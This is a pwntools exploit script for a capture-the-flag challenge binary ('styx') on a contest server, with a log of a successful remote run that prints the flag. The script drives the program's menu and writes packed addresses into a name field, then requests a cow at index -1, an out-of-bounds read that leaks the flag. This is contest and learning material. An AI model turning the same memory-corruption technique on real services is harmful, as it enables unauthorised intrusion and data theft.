#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# // ahpaleus //
# $ pwn template ./styx --host ecsc18.hack.cert.pl --port 10020
from pwn import *

exe = context.binary = ELF('./styx')

task_libc = './libc-2.23.so'
local_libc = '/lib/x86_64-linux-gnu/libc.so.6'

if args.LIBC:
    libc = ELF(task_libc)
else:
    libc = ELF(local_libc)

# ./exploit.py DEBUG NOASLR

host = args.HOST or 'ecsc18.hack.cert.pl'
port = int(args.PORT or 10020)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# ./exploit.py GDB
gdbscript = '''
tbreak *0x{exe.entry:x}
continue
'''.format(**locals())

io = start()

io.recvuntil('exit\n')

def set_name(name):
    io.sendline('1')
    io.recvuntil(': ')
    io.sendline(name)
    io.recvuntil('exit\n')

def show_name():
    io.sendline('2')
    print(io.recvuntil('exit\n'))

def create_a_cow(name):
    io.sendline('3')
    io.recvuntil(': ')
    io.sendline(name)
    io.recvuntil('exit\n')

def show_a_cow(number):
    io.sendline('4')
    io.recvuntil(': ')
    io.sendline(number)
    print(io.recvuntil('exit\n'))

def delete_a_cow(index):
    io.sendline('5')
    io.recvuntil(': ')
    io.sendline(index)
    io.recvuntil('exit\n')

set_name(p64(0x602140)+p64(0x602140))

show_a_cow(b'-1')

io.interactive()

'''
junior@junior:/mnt/hgfs/LEARN/pwn$ python3 exploit2.py REMOTE
[*] '/mnt/hgfs/LEARN/pwn/styx'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to ecsc18.hack.cert.pl on port 10020: Done
b"cow's name: 

ecsc{It_was_easy_to_spot_this_unintended_bug} 

\n\n1 - set your name\n2 - show your name\n3 - create new cow\n4 - show a cow\n5 - delete a cow\n6 - exit\n"
[*] Switching to interactive mode

'''